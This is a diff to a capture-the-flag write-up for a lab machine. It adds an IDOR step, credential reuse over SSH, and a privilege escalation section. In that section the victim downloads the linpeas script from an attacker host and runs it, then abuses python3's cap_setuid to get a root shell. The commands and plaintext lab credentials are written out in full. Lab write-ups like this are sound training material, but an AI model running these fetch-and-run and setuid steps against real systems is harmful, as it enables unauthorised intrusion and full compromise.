@@ -116,7 +116,7 @@ vsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb
 vsftpd 3.0.3 - Remote Denial of Service       | multiple/remote/49719.py
 ```
 
-Manually fuzz pages
+Manually fuzz pages: Insecure Direct Object Reference (IDOR)
 ```bash
 # http://10.10.10.245/data/0
 wget -O download-0.pcap http://10.10.10.245/download/0
@@ -143,6 +143,52 @@ apt install ftp ncftp lftp
 ncftp -P 21 -u nathan -p Buck3tH4TF0RM3! 10.10.10.245
 lftp -u nathan,Buck3tH4TF0RM3! -p 21 10.10.10.245
 
+# same ssh credentials
+ssh -o StrictHostKeyChecking=no nathan@10.10.10.245
+
 # flag
 cat /home/nathan/user.txt
+```
+
+### Privilege Escalation
+
+Upload privesc script
+```bash
+# [attacker] download and expose script
+mkdir -p /share/www && \
+  curl -sS -L -o /share/www/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh &&
+  python3 -m http.server -d /share/www
+
+# [victim] use tun0 <IP_ADDRESS> of attacker
+curl -o /dev/shm/linpeas.sh 10.10.14.14:8000/linpeas.sh
+bash /dev/shm/linpeas.sh -a > /dev/shm/linpeas.txt
+
+scp nathan@10.10.10.245:/dev/shm/linpeas.txt .
+less -r linpeas.txt
+
+# output
+Files with capabilities (limited to 50):
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
+
+`CAP_SETUID` allows the process to gain setuid privileges without the SUID bit set
+
+* [capabilities - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+
+```python
+# nathan@cap:~$ python3
+
+Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+>>> os.system('id')
+uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
+>>> os.setuid(0)
+>>> os.system('id')
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+>>> os.system('sh')
+
+# flag
+# cat /root/root.txt
 ```
